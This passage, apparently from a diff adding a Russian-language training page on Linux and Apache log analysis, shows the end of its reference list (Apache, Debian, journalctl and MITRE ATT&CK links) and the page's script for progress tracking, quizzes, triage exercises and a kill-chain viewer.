23.09.2026</span></li><li id="src-apache-logs"><a href="https://httpd.apache.org/docs/2.4/logs.html">Apache HTTP Server 2.4 — Log Files (Common/Combined Log Format)</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-debian12-log"><a href="https://www.debian.org/releases/bookworm/amd64/release-notes/ch-information.en.html">Debian 12 release notes, 5.1.7 Changes to system logging — rsyslog больше не ставится по умолчанию</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-man-journalctl"><a href="https://man7.org/linux/man-pages/man1/journalctl.1.html">journalctl(1) — man7.org</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-mitre-tactics"><a href="https://attack.mitre.org/tactics/enterprise/">MITRE ATT&amp;CK Enterprise Tactics, v19.2 (Stealth TA0005, Defense Impairment TA0112)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1110-001"><a href="https://attack.mitre.org/techniques/T1110/001/">ATT&amp;CK T1110.001 Brute Force: Password Guessing</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1021-004"><a href="https://attack.mitre.org/techniques/T1021/004/">ATT&amp;CK T1021.004 Remote Services: SSH</a><span class="checked"> — проверено справочная ссылка, при сборке не открывалась</span></li></ol>
+</div>
+<script>
+(function(){
+  // Прогресс: состояние в переменной, без хранилища браузера
+  var boxes=[].slice.call(document.querySelectorAll('.progress input'));
+  function upd(){var n=boxes.filter(function(b){return b.checked}).length;
+    document.getElementById('pcount').textContent=n+'/'+boxes.length;
+    document.getElementById('pfill').style.width=(boxes.length?100*n/boxes.length:0)+'%';}
+  boxes.forEach(function(b){b.addEventListener('change',upd)}); upd();
+  // Квиз
+  document.querySelectorAll('.q').forEach(function(q){
+    var opts=[].slice.call(q.querySelectorAll('.opt'));
+    opts.forEach(function(o){o.addEventListener('click',function(){
+      opts.forEach(function(x){x.disabled=true; if(x.dataset.ok==='1')x.classList.add('ok');});
+      if(o.dataset.ok!=='1')o.classList.add('no');
+      q.querySelector('.why').hidden=false;});});});
+  // Триаж
+  document.querySelectorAll('.triage').forEach(function(t){
+    var vs=[].slice.call(t.querySelectorAll('.verdict'));
+    vs.forEach(function(v){v.addEventListener('click',function(){
+      vs.forEach(function(x){x.disabled=true; if(x.dataset.v===t.dataset.answer)x.classList.add('ok');});
+      if(v.dataset.v!==t.dataset.answer)v.classList.add('no');
+      t.querySelector('.why').hidden=false;});});});
+  // Разбор строки
+  document.querySelectorAll('.field').forEach(function(f){
+    var segs=[].slice.call(f.querySelectorAll('.seg')), notes=[].slice.call(f.querySelectorAll('.segnote')), hint=f.querySelector('.fhint');
+    segs.forEach(function(s){s.addEventListener('click',function(){
+      segs.forEach(function(x){x.classList.toggle('on',x===s)});
+      notes.forEach(function(n){n.hidden=n.dataset.i!==s.dataset.i}); hint.hidden=true;});});
+    f.querySelector('.fall').addEventListener('click',function(){
+      notes.forEach(function(n){n.hidden=false}); segs.forEach(function(x){x.classList.remove('on')}); hint.hidden=true;});});
+  // Kill chain
+  document.querySelectorAll('.killchain').forEach(function(k){
+    var bs=[].slice.call(k.querySelectorAll('.kc')), ps=[].slice.call(k.querySelectorAll('.kcp'));
+    bs.forEach(function(b){b.addEventListener('click',function(){
+      bs.forEach(function(x){x.classList.toggle('on',x===b)});
+      ps.forEach(function(p){p.hidden=p.dataset.i!==b.dataset.i});});});
+    if(bs[0])bs[0].click();});
+})();
+</script>
+
+</body></html>
